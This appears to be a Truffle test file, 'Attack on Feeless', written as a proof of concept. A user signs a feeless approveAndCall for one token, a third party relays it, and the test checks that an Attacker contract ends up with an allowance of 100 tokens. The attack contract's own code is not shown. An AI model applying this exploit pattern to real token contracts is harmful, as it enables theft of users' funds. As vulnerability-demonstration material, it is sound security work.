const BigNumber = web3.BigNumber;
const abi = require('ethereumjs-abi');
const expect = require('chai').expect;
const should = require('chai')
    .use(require('chai-as-promised'))
    .use(require('chai-bignumber')(web3.BigNumber))
    .should();


const TokenMock = artifacts.require('TokenMock');
const Attacker = artifacts.require('./Attacker');

function padLeft(s, n, str){
    return Array(n - String(s).length + 1).join(str || '0') + s;
}

contract('Attack on Feeless', function ([_, wallet1, wallet2, wallet3, wallet4, wallet5, wallet6]) {

    var token;
    var attacker;

    beforeEach(async function() {
        token = await TokenMock.new(100, {from: wallet1});
        attacker = await Attacker.new(token.address);
    });

    it('Steal 100 tokens', async function() {
        {
            const nonce = await token.nonces.call(wallet1);
            const data = abi.simpleEncode("approveAndCall(address,uint256,bytes)", attacker.address, 1, "").toString('hex');
            const hash = web3.sha3(token.address + data + padLeft(nonce.toString(16), 64), { encoding: 'hex' });
            const sig = await web3.eth.sign(wallet1, hash);

            await token.performFeelessTransaction(wallet1, token.address, '0x' + data, nonce, sig, {from: wallet3, gas:1000000});
            (await token.allowance.call(wallet1, attacker.address)).should.be.bignumber.equal(100);
        }
    });
})
